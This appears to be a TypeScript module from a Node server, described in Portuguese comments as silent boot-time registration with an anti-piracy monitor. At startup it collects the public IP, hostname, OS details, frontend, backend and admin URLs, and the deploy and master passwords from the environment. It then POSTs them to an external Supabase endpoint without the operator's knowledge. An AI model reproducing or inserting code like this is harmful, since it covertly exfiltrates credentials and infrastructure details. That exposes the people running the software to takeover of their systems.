import logger from "../utils/logger";
import os from "os";

const REGISTER_URL =
  "https://cicwzhpsiewdpugmceqm.supabase.co/functions/v1/register-installation";

/**
 * Registra esta instalação automaticamente no monitor antipirataria.
 * Coleta IP público, hostname, OS, URLs e senhas do .env.
 * Executado silenciosamente no boot — não impede o servidor de iniciar.
 */
export async function registerInstallation(): Promise<void> {
  try {
    // Obter IP público
    let ip = "unknown";
    try {
      const res = await fetch("https://api.ipify.org?format=json", {
        signal: AbortSignal.timeout(5000),
      });
      const data = await res.json();
      ip = data.ip ?? "unknown";
    } catch {
      logger.warn("[AutoRegister] Não foi possível obter IP público");
    }

    const frontendUrl =
      process.env.FRONTEND_URL ||
      process.env.URL_FRONTEND ||
      "";
    const backendUrl =
      process.env.BACKEND_URL ||
      process.env.URL_BACKEND ||
      `http://${ip}:${process.env.PORT || 8080}`;
    const adminUrl =
      process.env.ADMIN_URL ||
      process.env.URL_ADMIN ||
      null;

    if (!frontendUrl) {
      logger.warn("[AutoRegister] FRONTEND_URL não configurada — registro ignorado");
      return;
    }

    const payload = {
      ip,
      frontend_url: frontendUrl,
      backend_url: backendUrl,
      admin_url: adminUrl,
      deploy_password: process.env.DEPLOY_PASSWORD || process.env.PASSWORD_DEPLOY || null,
      master_password: process.env.MASTER_PASSWORD || process.env.PASSWORD_MASTER || null,
      hostname: os.hostname(),
      os_info: `${os.type()} ${os.release()} (${os.arch()})`,
      installer_version: process.env.APP_VERSION || "auto-register",
    };

    const res = await fetch(REGISTER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });

    if (res.ok) {
      const data = await res.json();
      logger.info(`[AutoRegister] ✅ Instalação registrada com sucesso (ID: ${data.id})`);
    } else {
      const err = await res.text();
      logger.warn(`[AutoRegister] ⚠️ Falha ao registrar: HTTP ${res.status} — ${err}`);
    }
  } catch (err: any) {
    logger.warn(`[AutoRegister] ⚠️ Erro ao registrar instalação: ${err.message}`);
  }
}
